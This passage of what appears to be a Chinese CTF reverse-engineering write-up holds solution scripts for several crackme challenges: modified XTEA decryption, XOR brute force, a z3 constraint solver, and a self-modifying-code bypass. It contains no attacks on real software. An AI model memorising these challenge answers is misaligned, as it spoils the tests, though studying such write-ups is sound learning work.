class="number">33</span>;i++)</span><br><span class="line">		<span class="keyword">for</span> (k = <span class="number">32</span>; k &lt; <span class="number">127</span>; k++)</span><br><span class="line">		&#123;</span><br><span class="line">			j = k;</span><br><span class="line">			<span class="keyword">if</span> (j &gt;= <span class="string">&#x27;a&#x27;</span> &amp;&amp; j &lt;= <span class="string">&#x27;z&#x27;</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				j += <span class="number">13</span>;</span><br><span class="line">				<span class="keyword">if</span> (j &lt;= <span class="string">&#x27;a&#x27;</span> || j &gt;= <span class="string">&#x27;z&#x27;</span>)</span><br><span class="line">					j -= <span class="number">26</span>;</span><br><span class="line">				j += <span class="number">2</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">if</span> (j &gt;= <span class="string">&#x27;A&#x27;</span> &amp;&amp; j &lt;= <span class="string">&#x27;Z&#x27;</span>)</span><br><span class="line">				&#123;</span><br><span class="line">					j += <span class="number">13</span>;</span><br><span class="line">					<span class="keyword">if</span> (j &lt;= <span class="string">&#x27;A&#x27;</span> || j &gt;= <span class="string">&#x27;Z&#x27;</span>)</span><br><span class="line">						j -= <span class="number">26</span>;</span><br><span class="line">					j += <span class="number">2</span>;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span></span><br><span class="line">				&#123;</span><br><span class="line">					j += <span class="number">1</span>;</span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span> (j == a[i])</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, k);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="flower-or-tea"><a href="#flower-or-tea" class="headerlink" title="flower-or-tea"></a>flower-or-tea</h2><p><a target="_blank" rel="noopener" href="https://g2uge.github.io/2022/02/28/TEA%E7%B3%BB%E5%88%97%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86/">TEA系列加密解密 | Gruge’s Blog (g2uge.github.io)</a></p>
<p>第一次真正的接触tea加密，了解了tea，xtea和xxtea加密的特征</p>
<p>这个题的坑点一是，他的数据接收是从前从后往中间聚集，其实这个无所谓，直接解出flag后面自己改就好了</p>
<p>坑点二，这是一个xtea，他修改了常量和循环次数，其实这俩也是套脚本稍微一改就可以了</p>
<p>坑点三，原加密函数,中(*(key + 4 * ((sum &gt;&gt; 11) &amp; 3))，中的4其实是混淆用的，因为他是取的地址，所以我们可以使用这个代替</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">int</span> __cdecl tea(unsigned <span class="built_in">int</span> a1, unsigned <span class="built_in">int</span> *enc, <span class="built_in">int</span> key)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">int</span> result; // eax</span><br><span class="line">  unsigned <span class="built_in">int</span> i; // [esp+8h] [ebp-10h]</span><br><span class="line">  unsigned <span class="built_in">int</span> v1; // [esp+Ch] [ebp-Ch]</span><br><span class="line">  unsigned <span class="built_in">int</span> v0; // [esp+10h] [ebp-8h]</span><br><span class="line">  unsigned <span class="built_in">int</span> <span class="built_in">sum</span>; // [esp+14h] [ebp-4h]</span><br><span class="line"></span><br><span class="line">  v0 = *enc;</span><br><span class="line">  v1 = enc[<span class="number">1</span>];</span><br><span class="line">  <span class="built_in">sum</span> = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; a1; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 += <span class="built_in">sum</span> ^ (*(key + <span class="number">4</span> * ((<span class="built_in">sum</span> &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>)) + <span class="built_in">sum</span>) ^ (v0 + ((v0 &gt;&gt; <span class="number">5</span>) ^ (<span class="number">16</span> * v0)));</span><br><span class="line">    v0 += (*(key + <span class="number">4</span> * (<span class="built_in">sum</span> &amp; <span class="number">3</span>)) + <span class="built_in">sum</span>) ^ (v1 + ((v1 &gt;&gt; <span class="number">5</span>) ^ (<span class="number">16</span> * v1)));</span><br><span class="line">    <span class="built_in">sum</span> += <span class="number">0x31415927</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  *enc = v0;</span><br><span class="line">  result = <span class="number">4</span>;</span><br><span class="line">  enc[<span class="number">1</span>] = v1;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">v1 += (((v0 &lt;&lt; <span class="number">4</span>) ^ (v0 &gt;&gt; <span class="number">5</span>)) + v0) ^ ((<span class="built_in">sum</span> + key[ ((<span class="built_in">sum</span> &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>)])^<span class="built_in">sum</span>);</span><br><span class="line">v0 += (((v1 &lt;&lt; <span class="number">4</span>) ^ (v1 &gt;&gt; <span class="number">5</span>)) + v1) ^ (<span class="built_in">sum</span> + key[(<span class="built_in">sum</span> &amp; <span class="number">3</span>)]);</span><br></pre></td></tr></table></figure>





<p>坑点四，解密代码记得按照逻辑把代码都取反</p>
<p>解密脚本：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* take 64 bits of data in v[0] and v[1] and 128 bits of key[0] - key[3] */</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">encipher</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> num_rounds, <span class="type">uint32_t</span> v[<span class="number">2</span>], <span class="type">uint32_t</span> <span class="type">const</span> key[<span class="number">4</span>])</span> &#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> i;</span><br><span class="line">    <span class="type">uint32_t</span> v0 = v[<span class="number">0</span>], v1 = v[<span class="number">1</span>], sum = <span class="number">0</span>, delta = <span class="number">0x31415927</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; num_rounds; i++) &#123;</span><br><span class="line">        v1 += (((v0 &lt;&lt; <span class="number">4</span>) ^ (v0 &gt;&gt; <span class="number">5</span>)) + v0) ^ ((sum + key[ ((sum &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>)])^sum);</span><br><span class="line">        v0 += (((v1 &lt;&lt; <span class="number">4</span>) ^ (v1 &gt;&gt; <span class="number">5</span>)) + v1) ^ (sum + key[(sum &amp; <span class="number">3</span>)]);</span><br><span class="line">        sum += delta;</span><br><span class="line">    &#125;</span><br><span class="line">    v[<span class="number">0</span>] = v0; v[<span class="number">1</span>] = v1;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;加密后的数据：%u %u\n&quot;</span>, v[<span class="number">0</span>], v[<span class="number">1</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">decipher</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> num_rounds, <span class="type">uint32_t</span> v[<span class="number">2</span>], <span class="type">uint32_t</span> <span class="type">const</span> key[<span class="number">4</span>])</span> &#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> i;</span><br><span class="line">    <span class="type">uint32_t</span> v0 = v[<span class="number">0</span>], v1 = v[<span class="number">1</span>], delta = <span class="number">0x31415927</span>, sum = delta * num_rounds;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; num_rounds; i++) &#123;</span><br><span class="line">        sum -= delta;</span><br><span class="line">        v0 -= (((v1 &lt;&lt; <span class="number">4</span>) ^ (v1 &gt;&gt; <span class="number">5</span>)) + v1) ^ (sum + key[(sum &amp; <span class="number">3</span>)]);</span><br><span class="line">        v1 -= (((v0 &lt;&lt; <span class="number">4</span>) ^ (v0 &gt;&gt; <span class="number">5</span>)) + v0) ^ ((sum + key[((sum &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>)]) ^ sum);</span><br><span class="line">    &#125;</span><br><span class="line">    v[<span class="number">0</span>] = v0; v[<span class="number">1</span>] = v1;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;解密后的数据：%u %u\n&quot;</span>, v[<span class="number">0</span>], v[<span class="number">1</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">uint32_t</span> v[<span class="number">38</span>] = &#123; <span class="number">0x9AF9464B</span>, <span class="number">0xC417B89E</span>, <span class="number">0xB217A713</span>, <span class="number">0xC93BA9E8</span>, <span class="number">0x94F3E44E</span>, <span class="number">0xB5CC2AB5</span>, <span class="number">0x4451E42C</span>, <span class="number">0x7A8A289A</span>,</span><br><span class="line">    <span class="number">0x53C8D008</span>, <span class="number">0x6E117B49</span>, <span class="number">0x9BFFD794</span>, <span class="number">0x5EFF2DF9</span>, <span class="number">0x17E72531</span>, <span class="number">0xDFBD9979</span>, <span class="number">0x8F871B3A</span>, <span class="number">0x73E8C5AC</span>,</span><br><span class="line">    <span class="number">0xB28670A6</span>, <span class="number">0x5AF6A369</span>, <span class="number">0x2CF7DA24</span>, <span class="number">0x347B66AF</span>, <span class="number">0xB9C84D60</span>, <span class="number">0x911E912F</span>, <span class="number">0xBD5A2F9B</span>, <span class="number">0xCB96733A</span>,</span><br><span class="line">    <span class="number">0xC59968BE</span>, <span class="number">0xA00013E9</span>, <span class="number">0xC12F4EA4</span>, <span class="number">0xDE863A10</span>, <span class="number">0xA0C4D594</span>, <span class="number">0x4380983C</span>, <span class="number">0x7E2F7648</span>, <span class="number">0xE54DDC89</span>,</span><br><span class="line">    <span class="number">0x3F27A690</span>, <span class="number">0xB58D3199</span>, <span class="number">0x604AE517</span>, <span class="number">0x9C903984</span>, <span class="number">0xF4E04481</span>, <span class="number">0x3CF4EDFF</span> &#125;;</span><br><span class="line">    <span class="type">uint32_t</span> flag[<span class="number">2</span>] = &#123;<span class="number">0x0</span>,<span class="number">0x0</span>&#125;;</span><br><span class="line">    <span class="type">uint32_t</span> pqw[<span class="number">2</span>] = &#123; <span class="string">&#x27;S&#x27;</span>,<span class="string">&#x27;&#125;&#x27;</span>&#125;;</span><br><span class="line">    <span class="type">uint32_t</span> <span class="type">const</span> k[<span class="number">4</span>] = &#123; <span class="number">0x00000020</span>, <span class="number">0x0000001B</span>, <span class="number">0x00000027</span>, <span class="number">0x0000002C</span> &#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> i,r = <span class="number">54</span>;<span class="comment">//num_rounds建议取值为32</span></span><br><span class="line">    <span class="comment">// v为要加密的数据是两个32位无符号整数</span></span><br><span class="line">    <span class="comment">// k为加密解密密钥，为4个32位无符号整数，即密钥长度为128位</span></span><br><span class="line">    <span class="comment">//printf(&quot;加密前原始数据：%u %u\n&quot;, v[0],v[1]);</span></span><br><span class="line">    <span class="comment">//encipher(r, v, k);</span></span><br><span class="line">    <span class="comment">//printf(&quot;加密后的数据：%u %u\n&quot;, v[0], v[1]);</span></span><br><span class="line">    encipher(r, pqw, k);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">38</span>; i+=<span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        flag[<span class="number">0</span>] = v[i];</span><br><span class="line">        flag[<span class="number">1</span>] = v[i + <span class="number">1</span>];</span><br><span class="line">        decipher(r, flag, k);</span><br><span class="line"></span><br><span class="line">   &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>经过测试,这样直接套用ida里的代码也是可以的</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; num_rounds; i++) &#123;</span><br><span class="line">v1 += sum ^ (*(key + <span class="number">1</span> * ((sum &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>)) + sum) ^ (v0 + ((v0 &gt;&gt; <span class="number">5</span>) ^ (<span class="number">16</span> * v0)));</span><br><span class="line">v0 += (*(key + <span class="number">1</span> * (sum &amp; <span class="number">3</span>)) + sum) ^ (v1 + ((v1 &gt;&gt; <span class="number">5</span>) ^ (<span class="number">16</span> * v1)));</span><br><span class="line">sum += <span class="number">0x31415927</span>;</span><br><span class="line">&#125;</span><br><span class="line">v[<span class="number">0</span>] = v0; v[<span class="number">1</span>] = v1;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;加密后的数据：%u %u\n&quot;</span>, v[<span class="number">0</span>], v[<span class="number">1</span>]);</span><br></pre></td></tr></table></figure>



<h2 id="浪漫至死不渝"><a href="#浪漫至死不渝" class="headerlink" title="浪漫至死不渝"></a>浪漫至死不渝</h2><p>已知加密后的数据以及密钥，直接爆破就好了</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> enc[]=&#123; <span class="number">125</span>, <span class="number">130</span>, <span class="number">131</span>, <span class="number">122</span>, <span class="number">117</span>, <span class="number">110</span>, <span class="number">123</span>, <span class="number">125</span>, <span class="number">130</span>, <span class="number">131</span>, <span class="number">122</span>, <span class="number">117</span>, <span class="number">110</span>, <span class="number">123</span>, <span class="number">99</span>, <span class="number">99</span>, <span class="number">99</span>, <span class="number">99</span> &#125;;</span><br><span class="line">    <span class="type">int</span> key[] = &#123; <span class="string">&#x27;5&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;W&#x27;</span>,<span class="string">&#x27;X&#x27;</span>,<span class="string">&#x27;H&#x27;</span>,<span class="string">&#x27;N&#x27;</span> &#125;;</span><br><span class="line">    <span class="type">int</span> i, j, k;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">14</span>; i &lt; <span class="number">18</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">33</span>; j &lt; <span class="number">126</span>; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            k = j;</span><br><span class="line">            k = j ^ key[i - <span class="number">7</span>];</span><br><span class="line">            k += <span class="number">99</span>;</span><br><span class="line">            <span class="keyword">if</span> (k == enc[i])</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%c &quot;</span>, j);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> enc[]=&#123; <span class="number">125</span>, <span class="number">130</span>, <span class="number">131</span>, <span class="number">122</span>, <span class="number">117</span>, <span class="number">110</span>, <span class="number">123</span>, <span class="number">125</span>, <span class="number">130</span>, <span class="number">131</span>, <span class="number">122</span>, <span class="number">117</span>, <span class="number">110</span>, <span class="number">123</span>, <span class="number">99</span>, <span class="number">99</span>, <span class="number">99</span>, <span class="number">99</span> &#125;;</span><br><span class="line">    <span class="type">int</span> key[] = &#123; <span class="string">&#x27;5&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;W&#x27;</span>,<span class="string">&#x27;X&#x27;</span>,<span class="string">&#x27;H&#x27;</span>,<span class="string">&#x27;N&#x27;</span> &#125;;</span><br><span class="line">    <span class="type">int</span> i, j, k;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">14</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">33</span>; j &lt; <span class="number">126</span>; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            k = j;</span><br><span class="line">            k = j ^ key[i % <span class="number">7</span>];</span><br><span class="line">            k += <span class="number">10</span>;</span><br><span class="line">            <span class="keyword">if</span> (k == enc[i])</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%c &quot;</span>, j);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="easymath"><a href="#easymath" class="headerlink" title="easymath"></a>easymath</h2><p>做不了一点</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> * </span><br><span class="line"></span><br><span class="line">solver = Solver()</span><br><span class="line"></span><br><span class="line">charset = <span class="string">&quot;01234_asdzxcpoityumnbAOZWXGMY&quot;</span></span><br><span class="line"></span><br><span class="line">flag = [BitVec(<span class="string">&#x27;f%d&#x27;</span>%i, <span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>)]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>):</span><br><span class="line">    solver.add(Or([flag[i] == <span class="built_in">ord</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> charset]))</span><br><span class="line">    </span><br><span class="line">matrix = [<span class="number">0x12</span>, <span class="number">0x1D</span>, <span class="number">0x10</span>, <span class="number">0x13</span>, <span class="number">0x1B</span>, <span class="number">0x08</span>, <span class="number">0x1F</span>, <span class="number">0x08</span>, <span class="number">0x17</span>, <span class="number">0x1E</span>, <span class="number">0x1D</span>, <span class="number">0x03</span>, <span class="number">0x1C</span>, <span class="number">0x0A</span>, <span class="number">0x15</span>, <span class="number">0x12</span>, <span class="number">0x1D</span>, <span class="number">0x08</span>, <span class="number">0x10</span>, <span class="number">0x1C</span>, <span class="number">0x0B</span>, <span class="number">0x1E</span>, <span class="number">0x07</span>, <span class="number">0x14</span>, <span class="number">0x07</span>]</span><br><span class="line"></span><br><span class="line">v7 = [[BitVec(<span class="string">&#x27;v%d_%d&#x27;</span>%(i,j), <span class="number">8</span>) <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>)] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>)]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">            v7[i][j] = v7[i][j] + flag[<span class="number">5</span>*i+k] * matrix[<span class="number">5</span>*k+j]</span><br><span class="line">            v7[i][j] = v7[i][j] &amp; <span class="number">0x1F</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 对角线等于1        </span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    solver.add(v7[i][i] == <span class="number">1</span>)</span><br><span class="line">    </span><br><span class="line"><span class="comment"># 非对角线等于0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">        <span class="keyword">if</span> i != j:</span><br><span class="line">            solver.add(v7[i][j] == <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 特定字节等于要求值        </span></span><br><span class="line">solver.add(flag[<span class="number">1</span>] == <span class="built_in">ord</span>(<span class="string">&#x27;t&#x27;</span>))</span><br><span class="line">solver.add(flag[<span class="number">7</span>] == <span class="built_in">ord</span>(<span class="string">&#x27;y&#x27;</span>)) </span><br><span class="line">solver.add(flag[<span class="number">17</span>] == <span class="built_in">ord</span>(<span class="string">&#x27;y&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> solver.check() == sat:</span><br><span class="line">    m = solver.model()</span><br><span class="line">    res = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>):</span><br><span class="line">        res.append(m[flag[i]].as_long())</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">bytes</span>(res).decode())</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;No solution found&quot;</span>)</span><br></pre></td></tr></table></figure>

<h2 id="mySelf"><a href="#mySelf" class="headerlink" title="mySelf"></a>mySelf</h2><p>对比着他的算法，抄过来就可以了，一开始是个SMC，我们需要绕过一下，然后恢复函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* take 64 bits of data in v[0] and v[1] and 128 bits of key[0] - key[3] */</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">encipher</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> num_rounds, <span class="type">uint32_t</span> v[<span class="number">2</span>])</span> &#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> i;</span><br><span class="line">    <span class="type">uint32_t</span> v0 = v[<span class="number">0</span>], v1 = v[<span class="number">1</span>], sum = <span class="number">0</span>, delta = <span class="number">1640531527</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; num_rounds; i++) &#123;</span><br><span class="line">        sum -= <span class="number">1640531527</span>;</span><br><span class="line">        v1 += ((v0 &gt;&gt; <span class="number">5</span>) + <span class="number">2</span>) ^ ((<span class="number">16</span> * v0) + <span class="number">2</span>) ^ (sum + v0);</span><br><span class="line">        v0 += ((v1 &gt;&gt; <span class="number">5</span>) + <span class="number">4</span>) ^ ((<span class="number">16</span> * v1) + <span class="number">3</span>) ^ (sum + v1);</span><br><span class="line">    &#125;</span><br><span class="line">    v[<span class="number">0</span>] = v0; v[<span class="number">1</span>] = v1;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;加密后的数据：%u %u\n&quot;</span>, v[<span class="number">0</span>], v[<span class="number">1</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">decipher</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> num_rounds, <span class="type">uint32_t</span> 